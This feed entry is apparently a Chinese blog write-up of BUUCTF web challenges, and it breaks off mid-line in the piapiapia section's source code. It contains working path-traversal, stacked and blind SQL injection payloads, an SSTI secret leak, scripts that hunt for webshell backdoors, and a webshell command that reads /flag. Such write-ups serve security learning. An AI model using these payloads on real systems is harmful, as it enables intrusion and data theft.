    
  </entry>
  
  <entry>
    <title>BUUCTF web writeup(一)</title>
    <link href="http://chenxiyuan.vip/2019/07/21/BUUCTF-web-writeup/"/>
    <id>http://chenxiyuan.vip/2019/07/21/BUUCTF-web-writeup/</id>
    <published>2019-07-21T15:07:20.000Z</published>
    <updated>2019-07-29T03:23:50.294Z</updated>
    
    <content type="html"><![CDATA[<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p><a href="!http://web5.buuoj.cn">靶机</a><br>F12发现source.php,打开发现源码,顺着源码又发现了hint.php,得到<code>flag in ffffllllaaaagggg</code>,继续阅读源码。<br><a id="more"></a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><ul><li>mb_substr() 函数返回字符串的一部分， substr()函数只针对英文字符，如果要分割的中文文字则需要使用 mb_substr().</li><li>strpos() 函数查找字符串在另一字符串中第一次出现的位置（区分大小写）.<br>看到include $_REQUEST[‘file’]那就应该是文件包含读取<code>ffffllllaaaagggg</code>了,前两个条件file不为空且为字符串简单,主要是第三个条件,要通过chekFile函数返回True.<br>分析checkFile函数,有三次检测file是否是白名单中的内容,如果是则返回true.还有对$page进行的操作,如果有?则截取?之前的字符返回,如果没有则返回本身.<br>构造payload:<code>file=hint.php%3F/../../../../ffffllllaaaagggg</code>,首先第一次判断不通过，然后$page又返回自身,第二次判断不通过,进行url解码,<code>hint.php?/../../../../ffffllllaaaagggg</code>,然后$page返回?之前即<code>hint.php</code>通过第三次判断,返回true满足第三个条件.成功执行文件包含并目录穿越,读取到flag.<h2 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h2><a href="http://web16.buuoj.cn/" target="_blank" rel="noopener">靶机</a><br>这道题是2019强网杯的题,我有写过wp复现,<a href="http://chenxiyuan.vip/2019/05/27/2019%E5%BC%BA%E7%BD%91%E6%9D%AFwebwp">传送门</a>.<br>大致再记录一下吧.waf:<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code>过滤的其实不多,并且可以用堆叠注入查表和字段，多查询几次,整个数据库结构就清晰了。</li><li><code>&#39;;show tables;</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>&#39;;show columns from words;</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>&#39;;show columns from</code>1919810931114514<code>;</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以构造出原本的sql语句:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,<span class="string">`data`</span> <span class="keyword">FROM</span> words <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'1'</span> ;</span><br></pre></td></tr></table></figure></p><p>而select被过滤了,但查询语句查的是words表,而flag在另一个表中,如何查询呢?注意到waf黑名单其实过滤的很少的,比如alter和rename没被过滤就可以加以利用.我们可以把words表名改掉,再把flag所在表名改成words,再利用alter添加id字段,即可成功查询.payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;;rename table words to wordss;rename table `1919810931114514` to `words`;alter table words add id int default 1#</span><br></pre></td></tr></table></figure></p><p>另一种方法是利用自定义变量绕过.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos;;use supersqli;set @sqli=concat(&apos;se&apos;,&apos;lect `flag` from `1919810931114514`&apos;);PREPARE stmt1 FROM @sqli;EXECUTE stmt1;</span><br></pre></td></tr></table></figure></p><h2 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h2><p><a href="http://web15.buuoj.cn/" target="_blank" rel="noopener">靶机</a><br>也是强网杯2019的题目,下载到源码,是3000个混淆的文件,要我们从里面找到后门,那就本地搭建个环境,写个脚本自动跑好了.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">dirs = os.listdir(<span class="string">r'D:\phpStudy\WWW\test\src'</span>)</span><br><span class="line">url=<span class="string">'http://www.test.com/src/'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findit</span><span class="params">(f)</span>:</span></span><br><span class="line">    path=<span class="string">'D:\\phpStudy\\WWW\\test\\src\\'</span>+f</span><br><span class="line">    r = open(path, <span class="string">'r'</span>, encoding=<span class="string">'UTF-8'</span>).read()</span><br><span class="line">    print(<span class="string">'正在检测'</span> + f)</span><br><span class="line">    t = re.findall(<span class="string">"\$_POST\['(.*?)'\]"</span>,r,re.S)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> t:</span><br><span class="line">        data=&#123;i:<span class="string">'echo "find it";'</span>&#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'find it'</span> <span class="keyword">in</span> requests.post(url+f,data=data).text:</span><br><span class="line">            print(<span class="string">'get shell:'</span>+f+<span class="string">'post:'</span>+i)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    t = re.findall(<span class="string">"\$_GET\['(.*?)'\]"</span>, r, re.S)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> t:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'find it'</span> <span class="keyword">in</span> requests.get(url+f+<span class="string">'?'</span>+i+<span class="string">'='</span>+<span class="string">'echo "find it";'</span>).text:</span><br><span class="line">            print(<span class="string">'get shell:'</span>+f+<span class="string">'get:'</span>+i)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">149</span>):</span><br><span class="line">            onelist=dirs[i*<span class="number">20</span>:(i+<span class="number">1</span>)*<span class="number">20</span><span class="number">-1</span>]</span><br><span class="line">            threads=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> onelist:</span><br><span class="line">                t = threading.Thread(target=findit,args=(j,))</span><br><span class="line">                threads.append(t)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, len(threads) - <span class="number">1</span>):</span><br><span class="line">                threads[j].start()</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, len(threads) - <span class="number">1</span>):</span><br><span class="line">                threads[j].join()</span><br></pre></td></tr></table></figure></p><p>多进程再试试?<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line">dirs = os.listdir(<span class="string">r'D:\phpStudy\WWW\test\src'</span>)</span><br><span class="line">url=<span class="string">'http://www.test.com/src/'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findit</span><span class="params">(f)</span>:</span></span><br><span class="line">    path=<span class="string">'D:\\phpStudy\\WWW\\test\\src\\'</span>+f</span><br><span class="line">    r = open(path, <span class="string">'r'</span>, encoding=<span class="string">'UTF-8'</span>).read()</span><br><span class="line">    print(<span class="string">'正在检测'</span> + f)</span><br><span class="line">    t = re.findall(<span class="string">"\$_POST\['(.*?)'\]"</span>,r,re.S)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> t:</span><br><span class="line">        data=&#123;i:<span class="string">'echo "find it";'</span>&#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'find it'</span> <span class="keyword">in</span> requests.post(url+f,data=data).text:</span><br><span class="line">            print(<span class="string">'get shell:'</span>+f+<span class="string">'post:'</span>+i)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    t = re.findall(<span class="string">"\$_GET\['(.*?)'\]"</span>, r, re.S)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> t:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'find it'</span> <span class="keyword">in</span> requests.get(url+f+<span class="string">'?'</span>+i+<span class="string">'='</span>+<span class="string">'echo "find it";'</span>).text:</span><br><span class="line">            print(<span class="string">'get shell:'</span>+f+<span class="string">'get:'</span>+i)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">testall</span><span class="params">(allfile)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> allfile:</span><br><span class="line">        result = findit(i)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pool = multiprocessing.Pool(processes=<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(dirs), <span class="number">100</span>):</span><br><span class="line">        pool.apply_async(testall,args=(set(dirs[i:i+<span class="number">100</span>]),))</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br></pre></td></tr></table></figure></p><p>终于跑出来了，连上后门直接读<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web15.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</span><br></pre></td></tr></table></figure></p><h2 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h2><p><a href="http://web9.buuoj.cn" target="_blank" rel="noopener">靶机</a><br>得到提示<code>filehash:md5(cookie_secret + md5(filename))</code>并且flag在<code>/fllllllllllllag</code>,现在就是要得到cookie_secret.<br>访问错误的时候得到<code>http://web9.buuoj.cn/error?msg=Error</code>,这里运用了模板渲染<code>http://web9.buuoj.cn/error?msg=1</code>,测试一下果然.所以应该是服务端模板注入(ssti),一顿fuzz,还过滤了好多字符.看看<a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">黑翼天使23</a>,得到思路.<br>访问<code>http://web9.buuoj.cn/error?msg=</code>,返回:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;autoreload&apos;: True, &apos;compiled_template_cache&apos;: False, &apos;cookie_secret&apos;: &apos;M)Z.&gt;&#125;&#123;O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r&apos;&#125;</span><br></pre></td></tr></table></figure></p><p>根据hintMD5加密一下即可构造payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web9.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=70aed71508e50d160a73756a21e9953d</span><br></pre></td></tr></table></figure></p><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p><a href="http://web43.buuoj.cn/" target="_blank" rel="noopener">靶机</a><br>fuzz一下,过滤了挺多字符,空格就被过滤了,可以用括号绕过、换行绕过、或者制表符绕过.然后利用布尔盲注,可以利用返回1的时候输出<code>Hello, glzjin wants a girlfriend.</code>,当然也可以利用时间盲注不过会慢一点.写个脚本跑.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://web43.buuoj.cn/index.php"</span></span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">True</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;'</span>:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span> :<span class="string">"if(substr((select(flag)from(flag)),1,&#123;&#125;)='&#123;&#125;&#123;&#125;',1,2)"</span>.format(len(flag) + <span class="number">1</span>,flag,i)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        data = &#123;</span></span><br><span class="line"><span class="string">            'id': "ELT(left((select(flag)from(flag)),&#123;&#125;)='&#123;&#125;&#123;&#125;',1)".format(len(flag) + 1, flag, i)</span></span><br><span class="line"><span class="string">        &#125;"""</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"glzjin"</span> <span class="keyword">in</span> requests.post(url,data=data,headers=headers).text:</span><br><span class="line">            flag += i</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>学到了一个elt函数:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select elt(0,'a','b');</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| elt(0,'a','b') |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| NULL           |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="keyword">elt</span>(<span class="number">3</span>,<span class="string">'a'</span>,<span class="string">'b'</span>);</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| elt(3,'a','b') |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| NULL           |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="keyword">elt</span>(<span class="number">1</span>,<span class="string">'a'</span>,<span class="string">'b'</span>);</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| elt(1,'a','b') |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| a              |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p><h2 id="piapiapia"><a href="#piapiapia" class="headerlink" title="piapiapia"></a>piapiapia</h2><p><a href="http://web1.buuoj.cn/" target="_blank" rel="noopener">靶机</a><br>进去是登陆界面,小猫咪在piapiapia敲键盘,蛮可爱,一般这个时候没思路了就去扫描一下,应该会有源码泄露.<a href="http://www.zip成功下载源码" target="_blank" rel="noopener">www.zip成功下载源码</a>.</p><ul><li>config.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">$config[<span class="string">'password'</span>] = <span class="string">''</span>;</span><br><span class="line">$config[<span class="string">'database'</span>] = <span class="string">''</span>;</span><br><span class="line">$flag = <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>那么flag就应该在<code>config.php</code>里了.逻辑上应该register,再login,到profile检测为null,跳转到update页面,完成后再转到profile页面.再看看<code>profile.php</code>源码:</p><ul><li>profile.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Login First'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">$profile=$user-&gt;show_profile($username);</span><br><span class="line"><span class="keyword">if</span>($profile  == <span class="keyword">null</span>) &#123;</span><br><span class="line">header(<span class="string">'Location: update.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">"static/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">"static/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">"static/bootstrap.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class="container" style="margin-top:100px"&gt;  </span><br><span class="line">&lt;img src="data:image/gif;base64,&lt;?php echo $photo; ?&gt;" class="img-memeda " style="width:180px;margin:0px auto;"&gt;</span><br><span class="line">&lt;h3&gt;Hi <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $nickname;<span class="meta">?&gt;</span>&lt;/h3&gt;</span><br><span class="line">&lt;label&gt;Phone: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $phone;<span class="meta">?&gt;</span>&lt;/label&gt;</span><br><span class="line">&lt;label&gt;Email: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $email;<span class="meta">?&gt;</span>&lt;/label&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span 